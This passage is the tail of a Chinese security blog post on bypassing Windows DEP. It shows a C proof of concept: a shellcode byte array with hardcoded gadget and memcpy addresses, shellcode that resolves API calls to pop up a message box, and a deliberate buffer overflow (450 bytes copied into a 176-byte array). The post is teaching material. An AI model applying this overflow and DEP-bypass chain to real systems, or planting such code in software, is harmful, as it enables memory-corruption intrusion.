class="comment">//可执行内存中弹出对话框机器码的起始地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x14\x00&quot;</span><span class="comment">//可执行内存空间地址，复制用</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x61\x30\x5F\x5F\x68\x68\x75\x31\x79\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> tt[<span class="number">176</span>];</span><br><span class="line">	<span class="built_in">memcpy</span>(tt,shellcode,<span class="number">450</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">	<span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">	test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="https://www.rgzzplus.com/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/" title="数据与程序的分水岭:DEP" target="_blank" rel="external">https://www.rgzzplus.com/2022/06/27/数据与程序的分水岭-DEP/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/rgzz-zq" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/rgzz-zq" target="_blank"><span class="text-dark">人工智障plus</span><small class="ml-1x"></small></a></h3><div>一只网安菜鸟。</div></div></figure></div></div></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="prev"><a href="/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/" title="在内存中躲猫猫：ASLR"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a></li><li class="next"><a href="/2022/06/09/%E4%BA%A1%E7%BE%8A%E8%A1%A5%E7%89%A2%EF%BC%9ASafeSEH/" title="亡羊补牢：SafeSEH"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button"><span>[&nbsp;</span><span>文章目录</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"><div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/rgzz-zq" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul><div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_pv">总访问量：<span id="busuanzi_value_site_pv"></span></span> <span class="post-meta-divider"><br></span><span id="busuanzi_container_site_uv">总访客数：<span id="busuanzi_value_site_uv"></span></span></div><div class="copyright">&copy; 2022 rgzzplus<div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>window.INSIGHT_CONFIG={TRANSLATION:{POSTS:"文章",PAGES:"页面",CATEGORIES:"分类",TAGS:"标签",UNTITLED:"(未命名)"},ROOT_URL:"/",CONTENT_URL:"/content.json"}</script><script src="/js/insight.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!0,notify:!0,appId:"Ese7lhBjjv43UJw6zLdiIfS0-gzGzoHsz",appKey:"FF6J9UoHgtozwmftxTYfrvqn",placeholder:"说点什么吧！",avatar:"mm",meta:meta,pageSize:"10",visitor:!1})</script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script><script>$(document).ready(function(){$("article img").not("[hidden]").not(".panel-body img").each(function(){var a,t,n=$(this),e=n.attr("alt"),r=n.parent("a");r.length<1&&(-1!=(t=(a=this.getAttribute("src")).lastIndexOf("?"))&&(a=a.substring(0,t)),r=n.wrap('<a href="'+a+'"></a>').parent("a")),r.attr("data-fancybox","images"),e&&r.attr("data-caption",e)}),$().fancybox({selector:'[data-fancybox="images"]',hash:!1,loop:!1})})</script><script defer>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="//hm.baidu.com/hm.js?94cb135e2b01d42780f4972cb63e3884";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script></body></html>